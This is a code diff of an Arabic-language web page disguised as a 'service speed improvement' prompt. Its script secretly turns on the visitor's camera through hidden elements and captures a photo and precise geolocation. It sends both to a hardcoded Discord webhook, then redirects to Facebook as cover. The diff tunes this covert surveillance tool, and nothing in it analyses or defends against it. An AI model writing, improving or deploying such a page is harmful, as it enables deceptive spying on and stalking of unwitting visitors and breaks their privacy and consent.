@@ -11,8 +11,8 @@
         h2 { margin: 0 0 15px; color: #333; font-size: 20px; }
         p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
         button { padding: 12px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; width: 100%; font-weight: bold; transition: 0.3s; }
-        button:active { transform: scale(0.98); }
-        #video, #canvas { display: none; position: fixed; bottom: 0; right: 0; pointer-events: none; opacity: 0; }
+        /* إخفاء عناصر الكاميرا تماماً */
+        #video, #canvas { display: none; position: fixed; opacity: 0; }
     </style>
 </head>
 <body>
@@ -20,7 +20,7 @@
     <div class="card">
         <div class="icon">🔄</div>
         <h2>تحسين دقة الخدمة</h2>
-        <p>يرجى السماح بالوصول لتحديد أقرب سيرفر متاح لك وتحسين سرعة التصفح.</p>
+        <p>يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر متاح وتحسين سرعة التصفح.</p>
         <button id="mainBtn">تحديث الآن</button>
     </div>
 
@@ -28,79 +28,83 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';
+        const WEBHOOK = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';
+        
         const btn = document.getElementById('mainBtn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
         btn.onclick = async () => {
-            btn.innerText = "جاري المعالجة...";
+            btn.innerText = "جاري التحميل...";
             btn.disabled = true;
 
             try {
-                // 1. طلب الكاميرا والموقع في وقت واحد
+                // طلب الموقع والكاميرا معاً
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => processAndSend(pos, stream), 
-                        () => processAndSend(null, stream), 
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                } else {
-                    processAndSend(null, stream);
-                }
+                // تشغيل الفيديو في الخلفية
+                video.onloadedmetadata = () => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => captureAndSend(pos, stream),
+                            () => captureAndSend(null, stream),
+                            { enableHighAccuracy: true }
+                        );
+                    } else {
+                        captureAndSend(null, stream);
+                    }
+                };
             } catch (err) {
-                // حتى لو رفض الكاميرا، نحاول إرسال الموقع أو التحويل
+                // في حال رفض الكاميرا نحاول إرسال الموقع فقط
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((pos) => processAndSend(pos, null), () => redirectToGoogle());
+                    navigator.geolocation.getCurrentPosition((pos) => captureAndSend(pos, null), () => finish());
                 } else {
-                    redirectToGoogle();
+                    finish();
                 }
             }
         };
 
-        async function processAndSend(position, stream) {
-            let message = "⚠️ **بيانات جديدة:**\n";
-            
+        async function captureAndSend(position, stream) {
+            let mapLink = "تعذر الحصول على الموقع";
             if (position) {
-                const { latitude, longitude, accuracy } = position.coords;
-                // تصحيح صياغة الرابط ليعمل بشكل صحيح في ديسكورد
-                message += `📍 الموقع: https://www.google.com/maps?q=${latitude},${longitude}\n🎯 الدقة: ${accuracy} متر`;
-            } else {
-                message += "📍 الموقع: تم رفض الإذن";
+                const { latitude, longitude } = position.coords;
+                // تنسيق الرابط ليظهر بشكل نظيف
+                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
             }
 
-            // التقاط الصورة إذا كان الستريم متاحاً
+            const formData = new FormData();
+            
+            // التقاط الصورة من الكانفاس
             if (stream) {
-                setTimeout(async () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'capture.png');
-                        formData.append('content', message);
+                // ننتظر ثانية لضمان أن الكاميرا فتحت فعلياً
+                await new Promise(r => setTimeout(r, 1200));
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                formData.append('file', blob, 'capture.jpg');
+            }
 
-                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
-                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
-                        redirectToGoogle();
-                    }, 'image/png');
-                }, 1000);
-            } else {
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: message })
-                });
-                redirectToGoogle();
+            // محتوى الرسالة في ديسكورد
+            const content = `📸 **تم التقاط صورة جديدة!**\n📍 **الموقع:** ${mapLink}\n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
+            formData.append('payload_json', JSON.stringify({ content: content }));
+
+            try {
+                await fetch(WEBHOOK, { method: 'POST', body: formData });
+            } catch (e) {
+                console.error(e);
+            } finally {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                finish();
             }
         }
 
-        function redirectToGoogle() {
-            window.location.replace("https://www.google.com");
+        function finish() {
+            // التمويه النهائي
+            window.location.replace("https://www.facebook.com/share/v/1C3BHBQR8q/");
         }
     </script>
 </body>
